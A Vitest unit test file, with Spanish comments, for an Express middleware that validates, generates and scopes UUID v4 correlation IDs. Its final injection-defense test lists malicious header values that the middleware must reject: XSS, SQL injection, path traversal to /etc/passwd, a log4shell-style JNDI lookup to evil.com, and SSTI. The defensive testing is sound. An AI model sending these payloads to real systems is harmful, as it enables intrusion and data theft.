// US-114 (PB-P2-011 / QA-001) — Unit tests del middleware `correlationIdMiddleware`
// upgradeado (Zod validación + 400 fail-fast + `correlationContext.run()`) +
// helper `generateCorrelationId`.
//
// Cubre:
//   * UT-01 sin header → genera UUID v4, setea response header, ejecuta run().
//   * UT-02 header UUID v4 válido → reusa, response header echoed.
//   * UT-03 header inválido (no v4) → 400 INVALID_CORRELATION_ID con
//     `error.correlationId` server-generated (distinto del inválido del
//     cliente). next NO se invoca.
//   * UT-04 header vacío o solo whitespace → tratado como ausente.
//   * UT-05 header con UUID v1 → rechaza (regex v4-strict).
//   * UT-06 `generateCorrelationId()` retorna UUID v4 puro;
//     `generateCorrelationId('job-emit-t7')` retorna prefijado.
//   * Zod schema tests: v4 case-insensitive OK; v1/v7/garbage/injection rechaza.
//   * SEC-T-01 injection defense (payloads maliciosos → 400 antes de handlers).
import { describe, it, expect, vi } from 'vitest';
import { correlationIdMiddleware } from '../../src/shared/interface/middlewares/correlation-id.middleware.js';
import {
  correlationContext,
  generateCorrelationId,
  getCorrelationId,
} from '../../src/shared/context/correlation-id.js';
import {
  correlationIdSchema,
  UUID_V4_REGEX,
} from '../../src/shared/validation/correlation-id.schema.js';
import { createMockRequest, createMockResponse, asResponse } from '../helpers/express-mocks.js';

const VALID_V4 = '11111111-2222-4111-8111-333333333333';

describe('US-114 · correlationIdMiddleware (BE-004 · AC-01/02/03/04/07)', () => {
  it('UT-01 (AC-01): sin header → genera UUID v4 y ejecuta run()', () => {
    const req = createMockRequest({ headers: {} });
    const res = createMockResponse();
    let cidInsideRun: string | null = 'not-called';
    const next = vi.fn(() => {
      cidInsideRun = getCorrelationId();
    });

    correlationIdMiddleware(req, asResponse(res), next);

    expect(typeof req.correlationId).toBe('string');
    expect(UUID_V4_REGEX.test(req.correlationId!)).toBe(true);
    expect(res.headers['x-correlation-id']).toBe(req.correlationId);
    expect(cidInsideRun).toBe(req.correlationId);
    expect(next).toHaveBeenCalledOnce();
  });

  it('UT-02 (AC-02): header UUID v4 válido → reuso; response header echoed', () => {
    const req = createMockRequest({ headers: { 'x-correlation-id': VALID_V4 } });
    const res = createMockResponse();
    let cidInsideRun: string | null = 'not-called';
    const next = vi.fn(() => {
      cidInsideRun = getCorrelationId();
    });

    correlationIdMiddleware(req, asResponse(res), next);

    expect(req.correlationId).toBe(VALID_V4);
    expect(res.headers['x-correlation-id']).toBe(VALID_V4);
    expect(cidInsideRun).toBe(VALID_V4);
    expect(next).toHaveBeenCalledOnce();
  });

  it('UT-03 (AC-03 · SEC-04): header inválido → 400 con error.correlationId server-generated (no el inválido del cliente)', () => {
    const invalidClientId = 'not-a-uuid';
    const req = createMockRequest({ headers: { 'x-correlation-id': invalidClientId } });
    const res = createMockResponse();
    const next = vi.fn();

    correlationIdMiddleware(req, asResponse(res), next);

    expect(res.statusCode).toBe(400);
    // eslint-disable-next-line @typescript-eslint/no-explicit-any -- inspeccionar shape del envelope
    const body = res.body as any;
    expect(body.error.code).toBe('INVALID_CORRELATION_ID');
    expect(body.error.message).toContain('UUID v4');
    // El correlationId retornado NO es el inválido del cliente — es server-generated.
    expect(body.error.correlationId).not.toBe(invalidClientId);
    expect(UUID_V4_REGEX.test(body.error.correlationId)).toBe(true);
    // Response header con el server-generated (nunca el inválido del cliente).
    expect(res.headers['x-correlation-id']).toBe(body.error.correlationId);
    // next NO se invoca — el request se corta antes de auth/handlers.
    expect(next).not.toHaveBeenCalled();
  });

  it('UT-04 (EC-01): header vacío/whitespace → tratado como ausente → genera nuevo', () => {
    for (const empty of ['', '   ', '\t\n']) {
      const req = createMockRequest({ headers: { 'x-correlation-id': empty } });
      const res = createMockResponse();
      const next = vi.fn();
      correlationIdMiddleware(req, asResponse(res), next);
      expect(typeof req.correlationId).toBe('string');
      expect(UUID_V4_REGEX.test(req.correlationId!)).toBe(true);
      expect(next).toHaveBeenCalledOnce();
    }
  });

  it('UT-05 (EC-05): header con UUID v1 (version=1) → rechaza (regex v4-strict)', () => {
    // UUID v1 formato: la posición 15 es `1` en lugar de `4`.
    const uuidV1 = '11111111-2222-1111-8111-333333333333';
    const req = createMockRequest({ headers: { 'x-correlation-id': uuidV1 } });
    const res = createMockResponse();
    const next = vi.fn();

    correlationIdMiddleware(req, asResponse(res), next);

    expect(res.statusCode).toBe(400);
    expect(next).not.toHaveBeenCalled();
  });

  it('UT-05b: header con UUID v7 → rechaza (regex v4-strict)', () => {
    // UUID v7 formato: la posición 15 es `7` en lugar de `4`.
    const uuidV7 = '11111111-2222-7111-8111-333333333333';
    const req = createMockRequest({ headers: { 'x-correlation-id': uuidV7 } });
    const res = createMockResponse();
    const next = vi.fn();
    correlationIdMiddleware(req, asResponse(res), next);
    expect(res.statusCode).toBe(400);
    expect(next).not.toHaveBeenCalled();
  });

  it('correlationId dentro de run() no fuga fuera: fuera del middleware → null', () => {
    const req = createMockRequest({ headers: { 'x-correlation-id': VALID_V4 } });
    const res = createMockResponse();
    const next = vi.fn();
    correlationIdMiddleware(req, asResponse(res), next);
    // El `.run()` tiene scope acotado al callback (`next`). Fuera del scope
    // (aquí), `getCorrelationId()` retorna null porque no hay store activo.
    expect(getCorrelationId()).toBe(null);
  });
});

describe('US-114 · generateCorrelationId (BE-002 · UT-06)', () => {
  it('sin prefix → devuelve UUID v4 puro', () => {
    const id = generateCorrelationId();
    expect(UUID_V4_REGEX.test(id)).toBe(true);
  });

  it('con prefix "job-emit-t7" → shape `job-emit-t7-<uuid v4>`', () => {
    const id = generateCorrelationId('job-emit-t7');
    expect(id.startsWith('job-emit-t7-')).toBe(true);
    const uuid = id.slice('job-emit-t7-'.length);
    expect(UUID_V4_REGEX.test(uuid)).toBe(true);
  });

  it('2 llamadas consecutivas → IDs distintos', () => {
    const a = generateCorrelationId();
    const b = generateCorrelationId();
    expect(a).not.toBe(b);
  });

  it('reutilizable en jobs cron via correlationContext.run', () => {
    const cid = generateCorrelationId('job-x');
    let inside: string | null = 'never';
    correlationContext.run({ correlationId: cid }, () => {
      inside = getCorrelationId();
    });
    expect(inside).toBe(cid);
  });
});

describe('US-114 · correlationIdSchema (BE-001)', () => {
  it('acepta UUID v4 válido case-insensitive', () => {
    for (const cid of [
      '00000000-0000-4000-8000-000000000000',
      'AAAAAAAA-AAAA-4AAA-BAAA-AAAAAAAAAAAA',
      'ffffffff-ffff-4fff-9fff-ffffffffffff',
    ]) {
      expect(correlationIdSchema.safeParse(cid).success).toBe(true);
    }
  });

  it('rechaza UUID v1/v7/garbage', () => {
    for (const cid of [
      '00000000-0000-1000-8000-000000000000', // v1
      '00000000-0000-7000-8000-000000000000', // v7
      '00000000-0000-4000-c000-000000000000', // variante inválida (no 8/9/a/b)
      'not-a-uuid',
      '',
      '   ',
    ]) {
      expect(correlationIdSchema.safeParse(cid).success).toBe(false);
    }
  });

  it('SEC-T-01 (defensa injection): payloads maliciosos rechazan con 400 antes de handlers', () => {
    const maliciousPayloads = [
      '<script>alert(1)</script>',
      "'; DROP TABLE users; --",
      '../../etc/passwd',
      '\x00null-byte',
      '${jndi:ldap://evil.com/x}', // log4shell-style
      '{{7*7}}', // SSTI
    ];
    for (const payload of maliciousPayloads) {
      expect(correlationIdSchema.safeParse(payload).success).toBe(false);
      const req = createMockRequest({ headers: { 'x-correlation-id': payload } });
      const res = createMockResponse();
      const next = vi.fn();
      correlationIdMiddleware(req, asResponse(res), next);
      expect(res.statusCode).toBe(400);
      expect(next).not.toHaveBeenCalled();
      // El payload malicioso NUNCA se propaga al envelope.
      const bodyRaw = JSON.stringify(res.body);
      expect(bodyRaw).not.toContain(payload);
    }
  });
});
